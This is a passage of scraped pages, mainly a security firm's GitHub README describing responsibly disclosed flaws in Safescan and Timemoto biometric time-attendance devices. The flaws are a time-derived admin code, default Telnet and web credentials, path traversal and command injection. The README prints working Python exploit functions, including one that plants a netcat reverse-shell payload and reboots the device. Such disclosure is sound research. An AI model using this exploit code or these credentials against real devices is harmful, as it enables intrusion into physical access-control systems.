=== Content from support.timemoto.com_7763decd_20250120_235205.html ===




=== Content from github.com_7f859eaf_20250120_235203.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FProCheckUp%2FSafeScan)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  + [Nonprofits](/solutions/industry/nonprofits)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FProCheckUp%2FSafeScan)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E&source=header-repo&source_repo=ProCheckUp%2FSafeScan)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[ProCheckUp](/ProCheckUp)
/
**[SafeScan](/ProCheckUp/SafeScan)**
Public

* [Notifications](/login?return_to=%2FProCheckUp%2FSafeScan) You must be signed in to change notification settings
* [Fork
  2](/login?return_to=%2FProCheckUp%2FSafeScan)
* [Star
   5](/login?return_to=%2FProCheckUp%2FSafeScan)

[5
stars](/ProCheckUp/SafeScan/stargazers) [2
forks](/ProCheckUp/SafeScan/forks) [Branches](/ProCheckUp/SafeScan/branches) [Tags](/ProCheckUp/SafeScan/tags) [Activity](/ProCheckUp/SafeScan/activity)
 [Star](/login?return_to=%2FProCheckUp%2FSafeScan)

 [Notifications](/login?return_to=%2FProCheckUp%2FSafeScan) You must be signed in to change notification settings

* [Code](/ProCheckUp/SafeScan)
* [Issues
  2](/ProCheckUp/SafeScan/issues)
* [Pull requests
  0](/ProCheckUp/SafeScan/pulls)
* [Actions](/ProCheckUp/SafeScan/actions)
* [Projects
  0](/ProCheckUp/SafeScan/projects)
* [Security](/ProCheckUp/SafeScan/security)
* [Insights](/ProCheckUp/SafeScan/pulse)

Additional navigation options

* [Code](/ProCheckUp/SafeScan)
* [Issues](/ProCheckUp/SafeScan/issues)
* [Pull requests](/ProCheckUp/SafeScan/pulls)
* [Actions](/ProCheckUp/SafeScan/actions)
* [Projects](/ProCheckUp/SafeScan/projects)
* [Security](/ProCheckUp/SafeScan/security)
* [Insights](/ProCheckUp/SafeScan/pulse)

# ProCheckUp/SafeScan

    master[Branches](/ProCheckUp/SafeScan/branches)[Tags](/ProCheckUp/SafeScan/tags)Go to fileCode
## Folders and files

| Name | | Name | Last commit message | Last commit date |
| --- | --- | --- | --- | --- |
| Latest commit History[1 Commit](/ProCheckUp/SafeScan/commits/master/) | | |
| [README.md](/ProCheckUp/SafeScan/blob/master/README.md "README.md") | | [README.md](/ProCheckUp/SafeScan/blob/master/README.md "README.md") |  |  |
| [console.py](/ProCheckUp/SafeScan/blob/master/console.py "console.py") | | [console.py](/ProCheckUp/SafeScan/blob/master/console.py "console.py") |  |  |
| View all files | | |

## Repository files navigation

* README
# Remote code execution on biometric IoT devices

Biometric devices, which use unique physical features of users to authenticate them, have long been considered by the wider public the ideal balance of usability and security. No villain worth his salt would imagine not having an iris scanner to protect their evil lair. Although the Infosec industry has shifted away from this sentiment, the public at large still puts disproportionate amounts of trust in biometric devices for security purposes.

This blog post provides an example of what can go wrong when biometric devices are improperly built.

[picture of all bought devices - 1]

## The device

Access to ProCheckUp’s offices is controlled by a Safescan TA-803. Having both a fingerprint reader and an RFID reader, the devive’s main purpose is time-attendance, however it also includes some access-control capabilities, by unlocking the door to authorised users. It can be remotely administered through a dedicated API or a web-service.

On a slow afternoon in the office, I was asked to have a look at the Safescan to see whether it is really as safe as advertised. After all, being a cybersecurity company we ought to be sure our environment is well protected both on- and offline. After a quick search on a popular online auction website I found a second-hand Safescan TA-8035 up for grabs. This second-hand device would allow me to test vulnerabilities that would apply to our own machine also.

## A time derived backdoor

Upon receiving the second-hand Safescan, I realised the previous owner hadn’t reset it to factory settings – leaving data of the previous users on the device and locked down with a password I did not know. When I couldn’t find instruction for a full factory reset in the device manual, I decided to contact Safescan directly. What followed was an almost surreal phone conversation: the customer service representative asked whether I really wanted to reset the device or simply wished to gain administrative access. I decided to follow this cue and ask for the latter. All I had to do was provide the time as displayed on the front panel of my second-hand device and the customer service representative provided an 8-digit code to type into the machine. Following this phone call, I quickly managed to find the exact algorithm used by the device online, posted by an Alibaba vendor in an FAQ section on a similar, but differently branded, device. I now had a reliable way to gain administrative access within a matter of seconds, although this still required physical access to the machine.

[Picture of alibaba FAQ - 2]

## A default Telnet password

I connected my newly reset second-hand Safescan to an isolated network and found a few interesting ports:

```
PORT     STATE SERVICE       VERSION
23/tcp   open  telnet        BusyBox telnetd (SafeScan QTerm 1.0.4)
80/tcp   open  http          ZK Web Server (ZKSoftware ZEM500 fingerprint reader; MIPS)
81/tcp   open  http          ZK Web Server (ZKSoftware ZEM500 fingerprint reader; MIPS)
4360/tcp open  matrix_vnet?
4370/tcp open  elpro_tunnel?

```

The web service prompts for credentials, with the default being administrator with 123456 as a password.

[Picture of login page - 3]

From the web interface, I was able to download a backup of the device's configuration. Looking at the downloaded file, I noticed what looks like a header prepended before a tar archive:

[Hexdump of archive picture - 4]

By removing the header, I was then able to extract the archive. Inside a file named Config.cfg, a variable called $Telnet with what looks like a password sticks out:

```
$ cat ZKConfig.cfg
### snip ###
$Telnet=z1k2t3e4c5h
IsSupportHttps=1
SSLPASS=123456
### snip ###
WirelessSSID=**CENSORED**
WirelessKey=**CENSORED**
ialNumber=**CENSORED**
WirelessMode=0
WirelessAuth=2
WirelessEnc=1

```

I also found the password for the web service and the wireless credentials stored clearly in this text.

Looking at the `/etc/init.d/rcS` boot script that is used to launch all the services running on the device it appears the developers wanted to ensure that this password would remain, even if the password was changed from that default value by the user . The code doesn't work because the `USERDATAPATH` variable has a trailing slash.

```
if [ -f $USERDATAPATH/passwd ]; then
        mv $USERDATAPATH/passwd  /etc/passwd
fi
```

This is particularly egregious - why would Safescan want to force this password onto their users? We can only posture that this was intended to be disabled once shipped out to users or kept for servicing purposes. Neither reason warrants forcing a default, unchangeable Telnet password on customers. This feature has been disabled on the newer generation of Safescan devices, leading me to wishfully believe it is a simple mistake.

I continued exploring the filesystem further and found an image file called finger1.bmp. This turned out to be a picture file of the latest fingerprint to have been scanned – particularly troubling for a biometric device claiming this is not possible in its support pages, doubly so when considering the overall security of the device and the fact that unlike passwords, our fingerprints cannot be changed.

[Picture of claim - 5]

## Remote code execution

Emboldened by these findings I wanted to dig deeper and see if it was possible to gain remote code execution even with the root password having been changed. Given what I’d seen so far, I had little reason to doubt the possibility.

In a first step, I focussed on the API service running on port 4360, which runs by default and also exists on newer iterations of the product (e.g. the Timemoto TM-616, which is also affected by the vulnerabilities described below and sold by Safescan).

Initially, I simply extracted the binary and started looking at the documentation which revealed a number of interesting calls. However, the documentation lacked several key elements that would enable me to write a functioning exploit and would have forced me to fuzz the application.

In order to move forward nonetheless I started decompiling the binary using Ghidra, before Googling a few of the strings in the binary. Only when I searched Github directly for these did I find the complete source code for the firmware in multiple repositories. While this significantly facilitated exploitation, it isn't a requirement.

[Picture of github repo - 6]

A few interesting functions caught my attention.

### CMD\_READ\_FILE

As its name suggests, it allows users to retrieve files via the API. I wouldn't even call this an exploit as the method will simply return any file requested, however I did make heavy use of it when attacking the Timemoto TM-616, as I will discuss later. Certainly a vulnerability however, as you can see for yourself below.

[picture of exploit downloading passwd file - 7]

### CMD\_UPDATEFILE

The relevant portions of code handling requests for this method is shown below:

```
        case CMD_UPDATEFILE:
          {
                  char sTmp[40];
                  char sTmp1[10];

                  memset(sTmp,0,40);
                  memset(sTmp1,0,10);
                  memcpy(sTmp, p+4, sizeof(sTmp));
                  // snip
                  if (strstr(sTmp, ".jpg")) {
                      // snip
                  } else {
                          GetEnvFilePath("USERDATAPATH", sTmp, sFileName);
                  }
                  // snip
                  A=1;
                  break;
            }
```

```
char *GetEnvFilePath(const char *EnvName, const char *filename, char *fullfilename)
{
        if (getenv(EnvName))
                sprintf(fullfilename, "%s%s", getenv(EnvName), filename);
        else
                sprintf(fullfilename, "%s", filename);
        return fullfilename;
}
```

Now this one is interesting. Simply put, it allows me to upload any file to any location, as the service is running as root, the only user on the device. While the method attempts to only allow firmware files to be uploaded, a simple directory traversal easily takes care of that.
Armed with this knowledge, writing an exploit was rather trivial. A portion of the relevant exploit code is shown below:

```
def do_write_file(self, line):
    if not len(line) or len(line.split(' ')) != 2:
        print("[*] Usage: do_write_file <file> <dest>")
        return True
    file = line.split(' ')[0]
    dest = line.split(' ')[1]

    if dest[0] != '/':
        dest = '/' + dest

    dest_final = "../../.." + dest + '\x00\x00\x00'

    try:
        print("[-] Creating {}".format(file))
        with open(file, 'r') as fp:
            payload = fp.read()

        # prepare data
        self.z.send_command(1500, struct.pack('<II', len(payload), len(payload))) # CMD_PREPARE_DATA
        self.z.recv_reply()

        # send data
        self.z.send_command(1501, payload.encode()) # CMD_DATA
        self.z.recv_reply()

        # apply data
        data = bytearray()
        data.extend(struct.pack('<I', 1700)) # CMD_UPDATE_FILE
        data.extend(dest_final.encode())
        self.z.send_command(110, data)
        self.z.recv_reply()

    except Exception:
        traceback.print_exc()
```

With the ability to get any file using the `CMD_READ_FILE` command, I could read the init scripts and see what to upload and where to gain remote code execution. For the TA-8035, I wrote the following "all-in-one" command to gain code execution:

```
def do_auto_pwn_ta(self, line):
    """Writes a test.sh file to the device which will be executed and deleted at reboot by the TA device"""
    if not len(line) or len(line.split(':')) != 2:
        print("[*] Usage: write_file_pwn <LHOST:LPORT>")
        return True
    try:
        print("[-] Creating test.sh")
        payload = "(sleep 60 && nc {} -e /bin/sh)&".format(line)
        filename = "test.sh\x00"

        # prepare data
        print("[-] Preparing payload")
        self.z.send_command(1500, struct.pack('<II', len(payload), len(payload)))
        self.z.recv_reply()

        # send data
        print("[-] Sending payload")
        self.z.send_command(1501, payload.encode())
        self.z.recv_reply()

        # apply data
        print("[-] Saving payload")
        data = bytearray()
        data.extend(struct.pack('<I', 1700))
        data.extend(filename.encode())
        self.z.send_command(110, data)
        self.z.recv_reply()

        time.sleep(1)

        print("[-] Sending reboot command")
        self.z.restart()
        print("[+] Done. Device will reboot now.\nTo catch shell: nc -nlvp {}".format(line.split(':')[1]))

    except Exception:
        traceback.print_exc()
```

Using the same method as above, but tailored to the device, I uploaded a `test.sh` file to the `/mnt/mtdblock/data` directory, which was executed and conveniently deleted by the device at boot, as scripted below:

`/etc/init.d/rcS`:

```
if [ -f $USERDATAPATH/auto.sh ]; then
        #start delegate and inotify
        /etc/start_delegate.sh &
        . $USERDATAPATH/auto.sh
fi
```

`auto.sh`:

```
if [ -f $DEST/test.sh ]; then
        cd $DEST && chmod u+x $DEST/test.sh && $DEST/test.sh
        rm test.sh
fi
```

To exploit the Timemoto TM-616, I simply downloaded the `rcS` file and patched it to start the telnet service. After cracking the shadow file, downloaded via the `CMD_READ_FILE` method, I was able to log in. The password was `solokey` and while I cannot praise the choice of password, I must also state there was originally no way to log in.

## More?

Yes! As some may have noticed, not only does the `CMD_UPLOAD_FILE` ~~method~~ ~~function~~ case (the function is over 2,500 lines long) not sanitise for directory traversal, it also fails to protect against command injection. This snippet shows how to exploit it:

```
def do_command_exec(self, line):
    """Extremely iffy. Prefer write file method. Massive memory leaks and bounds checking issues make this method unstable and risk crashing target."""
    if not len(line):
        print("[*] Usage: command_exec <cmd>\n[*] Output will not be returned, but you could write to a file and get it afterwards. Busybox nc does not have -e option\n")
        return True
    try:
        # prepare data
        self.z.send_command(1500, struct.pack('<II', 1, 1))
        self.z.recv_reply()

        # send data
        self.z.send_command(1501, 'a'.encode())
        self.z.recv_reply()

        # apply data
        data = bytearray()
        data.extend(struct.pack('<I', 1700))
        payload = '; ' + line + '; echo \x00\x00'
        data.extend(payload.encode())
        self.z.send_command(110, data)
        self.z.recv_reply()

    except Exception:
        traceback.print_exc()
```

However due to lacklustre memory management and the use of C, I had a hard time getting this to work consistently and had better luck using the method described earlier.

If you thought that was it, think again, it doesn’t stop here. Digging deeper, I also noticed the API is vulnerable to SQL injections but unfortunately I lost my notes on this vector. As the device was running `sqlite` and prevented stacked queries, I couldn't get code execution this way anyhow.

I'm also sure there is a few buffer overflow vectors in there, however exploiting these would be overkill given the methods I already had to gain access to the devices.

## Conclusion

There's surely a number of conclusions one could reach after reading this, however, what I desperately want to stress is that security needs to be designed into the product from its very inception. A responsible disclosure point of contact would have been greatly beneficial to Safescan, its customers and myself. It took six months for me to even succeed at getting an answer from the vendor, as they initially discarded my messages as an attempted scam, which I understand.

I have also learned a lot from the process and, reflecting, there are a number of ways disclosure processes ought to be improved.

As cybersecurity experts, we have an odd relationship with vendors: we report issues in their products to them, but we must do more to help them understand what we are doing and why we are doing it. We must understand the point of view of the vendor, who didn't ask for their devices to be hacked. While we understand that they are lucky we did, we cannot expect immediate gratification and must accept their scepticism and remonstrances and most importantly take the time to explain the necessity of our actions.

### Timeline:

* Initial disclosure: 02/11/2018
* Response: 17/05/2019
* Technical disclosure: 06/06/2019
* Fix released: 08/2019

## About

No description, website, or topics provided.
### Resources

[Readme](#readme-ov-file)

[Activity](/ProCheckUp/SafeScan/activity)
[Custom properties](/ProCheckUp/SafeScan/custom-properties)
### Stars

[**5**
stars](/ProCheckUp/SafeScan/stargazers)
### Watchers

[**1**
watching](/ProCheckUp/SafeScan/watchers)
### Forks

[**2**
forks](/ProCheckUp/SafeScan/forks)
[Report repository](/contact/report-content?content_url=https%3A%2F%2Fgithub.com%2FProCheckUp%2FSafeScan&report=ProCheckUp+%28user%29)

## [Releases](/ProCheckUp/SafeScan/releases)

No releases published

## [Packages 0](/orgs/ProCheckUp/packages?repo_name=SafeScan)

No packages published

## Languages

* [Python
  100.0%](/ProCheckUp/SafeScan/search?l=python)

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from procheckup.com_59baf0db_20250120_235204.html ===


* [Home](/)
* Penetration Testing

  ### [Penetration Testing Services](/services/security-audit/)

  + [Application Penetration Testing](/services/security-audit/application-testing/)
  + [Breakout testing - Citrix and network pivoting](/services/security-audit/breakout-testing/)
  + [Infrastructure Penetration Testing](/services/security-audit/infrastructure-testing/)
  + [IoT Penetration Testing](/services/penetration-testing-and-security-audit/iot-penetration-testing/)
  + [IVR System Penetration Testing](/services/penetration-testing-and-security-audit/ivr-system-security-testing/)
  + [Mobile Application Penetration Testing](/services/security-audit/mobile-application-testing/)
  + [NCSC IT Health Checks](/services/security-audit/ncsc-it-health-checks/)
  + [Red/Blue/Purple Teaming](/services/security-audit/red-teaming/)
  + [Social Engineering](/services/security-audit/social-engineering/)
  + [Supply Chain testing](/services/security-audit/supply-chain-testing/)
  + [Web Application Penetration Testing](/services/penetration-testing-and-security-audit/web-application-penetration-testing/)
  + [Wireless Penetration Testing](/services/security-audit/wireless-testing/)
  ### [Cloud Penetration Testing](/services/penetration-testing-and-security-audit/cloud-penetration-testing/)

  + [AWS Cloud Penetration Testing](/services/penetration-testing-and-security-audit/aws-cloud-penetration-testing/)
  + [Azure Penetration Testing](/services/penetration-testing-and-security-audit/azure-penetration-testing/)

  ### Penetration Testing Information

  + [What Is API Security Testing?](/cyber-security-glossary/api-security-testing/)
  + [What is Authentication?](/cyber-security-glossary/what-is-authentication/)
  + [What is Penetration Testing?](/cyber-security-glossary/penetration-testing/)
  + [What is Phishing?](/cyber-security-glossary/phishing/)
  + [What is Red Teaming?](/cyber-security-glossary/red-teaming/)
  + [What is Social Engineering?](/cyber-security-glossary/social-engineering/)
* Compliance

  ### [Compliance Services](/services/compliance-advisory/)

  + [Cyber Assurance Certification](/services/compliance-advisory/cyber-assurance/)
  + [Cyber Essentials Plus Certification](/services/compliance-advisory/cyber-essentials-plus/)
  + [GDPR Compliance](/services/compliance-advisory/gdpr/)
  + [ISO 27001 Compliance](/services/compliance-advisory/iso-27001/)
  + [PCI DSS Compliance](/services/compliance-advisory/pci-dss/)
  + [PCI DSS QSA Consultancy](/services/compliance-advisory/pci-qsa/)
  + [PCI DSS ASV Scanning](/services/compliance-advisory/pci-asv/)
  + [PECR Compliance](/services/compliance-advisory/pecr/)
  + [PSN Compliance (ITHC)](/services/compliance-advisory/psn-compliance-ithc/)
  + [Cyber Maturity Assessment](/services/compliance-advisory/cyber-maturity-assessment/)
  + [Data Protection Impact Assessments (DPIA)](/services/compliance-advisory/data-protection-impact-assessments-dpia/)
  + [Training Services](/services/compliance-advisory/training-services/)

  ### Compliance Information

  + [Developing a SME Cyber-security Policy](/services/compliance-advisory/developing-a-sme-cybersecurity-policy/)
  + [PCI Compliance](https://www.procheckup.com/cyber-security-glossary/pci-compliance/)
  + [Securing Your eCommerce Platform](/cyber-security-glossary/securing-your-ecommerce-platform/)
  + [The ProCheckUp 12 Steps to GDPR Guide](/cyber-security-glossary/the-12-steps-to-gdpr-guide/)
  + [What is Agile SDLC? (Software Development Life Cycle)](/cyber-security-glossary/agile-sdlc/)
  + [What is Cyber Essentials?](/cyber-security-glossary/cyber-essentials/)
  + [What is Cyber Security?](/cyber-security-glossary/cyber-security/)
  + [What is ISO27001 Annex A?](/cyber-security-glossary/iso27001-annex-a/)
  + [Transitioning to PCI-DSS v4.0](/services/compliance-advisory/transitioning-to-pci-dss-version-40/)
* Security Assessment

  ### [Security Assessment Services](/services/security-risk/)

  + [Architecture Security Review](/services/security-risk/architecture-security-review)
  + [Build Reviews](/services/security-audit/build-reviews/)
  + [CREST STAR Assessments](/services/compliance-advisory/crest-star-assessments/)
  + [Data discovery](/services/security-risk/data-discovery)
  + [Device Security Reviews](/services/penetration-testing-and-security-audit/laptop-and-mobile-devices-security-reviews/)
  + [External Internet discovery](/services/security-risk/external-internet-discovery)
  + [Internal Network Discovery & Mapping](/services/security-risk/internal-network-discovery)
  + [Managed Scanning Service (VA)](/services/penetration-testing-and-security-audit/managed-scanning-service/)
  + [M&A Security Assessment](/services/security-risk/mergers-and-acquisitions)
  + [Virtual/Onsite CISO Services](/services/security-risk/onsiteremote-security-manager/)
  + [OSINT Services](/services/security-risk/open-source-intelligence-gathering)
  + [Physical Security Audit](/services/security-risk/physical-security-audit)
  + [Network Segmentation Testing](/services/security-risk/segmentation-testing)
  + [Targeted Attack Resistance Assessment](/services/security-risk-understanding-assessing-and-mitigating-threats/targeted-attack-resistance-assessment)
  + [Vulnerability Assessment](/services/security-audit/vulnerability-assessment/)

  ### Security Assessment Information

  + [What are Build Reviews?](/cyber-security-glossary/build-reviews/)
  + [What is a Code Review?](/cyber-security-glossary/code-reviews/)
  + [What is Cyber Security?](/cyber-security-glossary/cyber-security/)
  + [What is Edge Testing?](/cyber-security-glossary/edge-testing/)
* Incident Response Services

  ### [Security Assessment Services](/services/security-risk/)

  + [Breach Impact Assessments](/services/incident-response/breach-impact-assessments/)
  + [eDisclosure & eDiscovery](/services/incident-response/edisclosure-ediscovery/)
  + [Digital Forensics](/services/incident-response/forensics/)
  + [Forensic Readiness Planning](/services/incident-response/forensics-readiness-plan/)
  + [Gold Teaming](/services/incident-response/gold-teaming/)
  + [Malware Analysis & Reverse Engineering](/services/incident-response/malware-reverse-engineering/)
  + [Intrusion Analysis & Compromise Assessment](/services/incident-response/intrusion-analysis/)
  + [Incident Response Services](/services/incident-response/incident-response/)
  + [Incident Response Retainer](/services/incident-response/incident-response-retainer/)
  + [Technical Services Counter Measures (TSCM)](/services/incident-response/technical-services-counter-measures-tscm/)
  + [Forensic First Responder (FFR)](/services/training-and-knowledge-transfer/forensic-first-responder-ffr/)

  ### Incident Response Information

  + [Introduction to Ransomware Protection](/services/incident-response-and-forensics/introduction-to-ransomware-protection/)
  + [Stolen Laptop Case Study](/services/stolen-laptop-case-study/)
  + [What is Cyber Security?](/cyber-security-glossary/cyber-security/)
* Sectors

  ### [Sectors](/industries/)

  + [Central Government Sector](/industries/central-government/)
  + [Energy and Utilities Sector](/sectors/energy-and-utilities/)
  + [Financial Services Sector](/industries/financial-services-sector/)
  + [HealthCare Sector](/industries/healthcare-sector/)
  + [Local Government Sector](/industries/local-government-sector/)
  + [Manufacturing Sector](/sectors/manufacturing-sector/)
  + [Retail and E-Commerce Sector](/sectors/retail-and-e-commerce/)
* [About Us](/about-us/)
  + [Company](/about-us/)
  + [Accreditations](/about-us/accreditations/)
  + [News](/news/)
  + [Blogs](/blogs/)
  + [Careers & Team](/about-us/careers-team/)
  + [Privacy Policy](/about-us/privacy-policy/)
* [Events](/events/)
* [Contact](/contact/)

[![](/media/2hkj213g/logo.png)](/)

+44(0)207 6127777

* [Penetration Testing](/services/security-audit/)

  ### [Penetration Testing Services](/services/security-audit/)

  - [Application Penetration Testing](/services/security-audit/application-testing/)
  - [Breakout testing - Citrix and network pivoting](/services/security-audit/breakout-testing/)
  - [Infrastructure Penetration Testing](/services/security-audit/infrastructure-testing/)
  - [IoT Penetration Testing](/services/penetration-testing-and-security-audit/iot-penetration-testing/)
  - [IVR System Penetration Testing](/services/penetration-testing-and-security-audit/ivr-system-security-testing/)
  - [Mobile Application Penetration Testing](/services/security-audit/mobile-application-testing/)
  - [NCSC IT Health Checks](/services/security-audit/ncsc-it-health-checks/)
  - [Red/Blue/Purple Teaming](/services/security-audit/red-teaming/)
  - [Social Engineering](/services/security-audit/social-engineering/)
  - [Supply Chain testing](/services/security-audit/supply-chain-testing/)
  - [Web Application Penetration Testing](/services/penetration-testing-and-security-audit/web-application-penetration-testing/)
  - [Wireless Penetration Testing](/services/security-audit/wireless-testing/)
  ### [Cloud Penetration Testing](/services/penetration-testing-and-security-audit/cloud-penetration-testing/)

  - [AWS Cloud Penetration Testing](/services/penetration-testing-and-security-audit/aws-cloud-penetration-testing/)
  - [Azure Penetration Testing](/services/penetration-testing-and-security-audit/azure-penetration-testing/)

  - Pentesting Information
  - [What Is API Security Testing?](/cyber-security-glossary/api-security-testing/)
  - [What is Authentication?](/cyber-security-glossary/what-is-authentication/)
  - [What is Penetration Testing?](/cyber-security-glossary/penetration-testing/)
  - [What is Phishing?](/cyber-security-glossary/phishing/)
  - [What is Red Teaming?](/cyber-security-glossary/red-teaming/)
  - [What is Social Engineering?](/cyber-security-glossary/social-engineering/)
  - Useful Pages
  - [Apply for corporate account.](/procheckup-corporate-account/)
  - [Talk to a cybersecurity expert.](/procheckup-cybersecuriy-expert/)
  - [Security Research.](/procheckup-labs/)
  - [ProCheckUp's Engagement Process.](/services/penetration-testing-and-security-audit/processes//)
  - [Portal access.](https://portal.procheckup.com/)
  - [Reporting access.](https://remote.procheckup.com)
* [Compliance](/services/compliance-advisory/)

  ### [Compliance Services](/services/compliance-advisory/)

  - [Cyber Assurance Certification](/services/compliance-advisory/cyber-assurance/)
  - [Cyber Essentials Plus Certification](/services/compliance-advisory/cyber-essentials-plus/)
  - [GDPR Compliance](/services/compliance-advisory/gdpr/)
  - [ISO 27001 Compliance](/services/compliance-advisory/iso-27001/)
  - [PCI DSS Compliance](/services/compliance-advisory/pci-dss/)
  - [PCI DSS QSA Consultancy](/services/compliance-advisory/pci-qsa/)
  - [PCI DSS ASV Scanning](/services/compliance-advisory/pci-asv/)
  - [PECR Compliance](/services/compliance-advisory/pecr/)
  - [PSN Compliance (ITHC)](/services/compliance-advisory/psn-compliance-ithc/)
  - [Cyber Maturity Assessment](/services/compliance-advisory/cyber-maturity-assessment/)
  - [Data Protection Impact Assessments (DPIA)](/services/compliance-advisory/data-protection-impact-assessments-dpia/)
  - [Training Services](/services/compliance-advisory/training-services/)

  - Compliance Information
  - [Developing a SME Cyber-security Policy](/services/compliance-advisory/developing-a-sme-cybersecurity-policy/)
  - [PCI Compliance](https://www.procheckup.com/cyber-security-glossary/pci-compliance/)
  - [Securing Your eCommerce Platform](/cyber-security-glossary/securing-your-ecommerce-platform/)
  - [The ProCheckUp 12 Steps to GDPR Guide](/cyber-security-glossary/the-12-steps-to-gdpr-guide/)
  - [What is Agile SDLC? (Software Development Life Cycle)](/cyber-security-glossary/agile-sdlc/)
  - [What is Cyber Essentials?](/cyber-security-glossary/cyber-essentials/)
  - [What Is A Cyber Maturity Assessment?](/cyber-security-glossary/what-is-a-cyber-maturity-assessment/)
  - [What is Cyber Security?](/cyber-security-glossary/cyber-security/)
  - [What is ISO27001 Annex A?](/cyber-security-glossary/iso27001-annex-a/)
  - [Transitioning to PCI-DSS v4.0](/services/compliance-advisory/transitioning-to-pci-dss-version-40/)
  - Useful Pages
  - [Apply for corporate account.](/procheckup-corporate-account/)
  - [Talk to a cybersecurity expert.](/procheckup-cybersecuriy-expert/)
  - [Security Research.](/procheckup-labs/)
  - [ProCheckUp's Engagement Process.](/services/penetration-testing-and-security-audit/processes//)
  - [Portal access.](https://portal.procheckup.com/)
  - [Reporting access.](https://remote.procheckup.com)
* [Security Assessment](/services/security-risk/)

  ### [Security Assessment Services](/services/security-risk/)

  - [Architecture Security Review](/services/security-risk/architecture-security-review)
  - [Build Reviews](/services/security-audit/build-reviews/)
  - [CREST STAR Assessments](/services/compliance-advisory/crest-star-assessments/)
  - [Data discovery](/services/security-risk/data-discovery)
  - [Device Security Reviews](/services/penetration-testing-and-security-audit/laptop-and-mobile-devices-security-reviews/)
  - [External Internet discovery](/services/security-risk/external-internet-discovery)
  - [Internal Network Discovery & Mapping](/services/security-risk/internal-network-discovery)
  - [Managed Scanning Service (VA)](/services/penetration-testing-and-security-audit/managed-scanning-service/)
  - [M&A Security Assessment](/services/security-risk/mergers-and-acquisitions)
  - [Virtual/Onsite CISO Services](/services/security-risk/onsiteremote-security-manager/)
  - [OSINT Services](/services/security-risk/open-source-intelligence-gathering)
  - [Physical Security Audit](/services/security-risk/physical-security-audit)
  - [Network Segmentation Testing](/services/security-risk/segmentation-testing)
  - [Targeted Attack Resistance Assessment](/services/security-risk-understanding-assessing-and-mitigating-threats/targeted-attack-resistance-assessment)
  - [Vulnerability Assessment](/services/security-audit/vulnerability-assessment/)

  - Security Assessment Information
  - [What are Build Reviews?](/cyber-security-glossary/build-reviews/)
  - [What is a Code Review?](/cyber-security-glossary/code-reviews/)
  - [What is Cyber Security?](/cyber-security-glossary/cyber-security/)
  - [What is Edge Testing?](/cyber-security-glossary/edge-testing/)
  - Useful Pages
  - [Apply for corporate account.](/procheckup-corporate-account/)
  - [Talk to a cybersecurity expert.](/procheckup-cybersecuriy-expert/)
  - [Security Research.](/procheckup-labs/)
  - [ProCheckUp's Engagement Process.](/services/penetration-testing-and-security-audit/processes//)
  - [Portal access.](https://portal.procheckup.com/)
  - [Reporting access.](https://remote.procheckup.com)
* [Incident Response](/services/incident-response/)

  ### [Incident Response Services](/services/incident-response/)

  - [Breach Impact Assessments](/services/incident-response/breach-impact-assessments/)
  - [eDisclosure & eDiscovery](/services/incident-response/edisclosure-ediscovery/)
  - [Digital Forensics](/services/incident-response/forensics/)
